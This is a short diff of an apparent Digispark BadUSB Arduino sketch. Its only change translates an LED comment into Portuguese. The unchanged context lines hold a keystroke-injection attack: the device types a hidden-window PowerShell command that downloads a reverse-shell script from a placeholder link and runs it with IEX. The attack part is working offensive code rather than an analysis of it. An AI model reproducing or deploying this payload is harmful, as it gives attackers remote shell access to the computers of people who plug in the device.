@@ -46,7 +46,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('Your link to download a revshell.ps1');\"");
   DigiKeyboard.delay(200);  
-  digitalWrite(1, HIGH); //turn on led when program finishes
+  digitalWrite(1, HIGH); //Liga o led quanto acabar o script
   DigiKeyboard.delay(90000);
   digitalWrite(1, LOW); 
   DigiKeyboard.delay(5000);
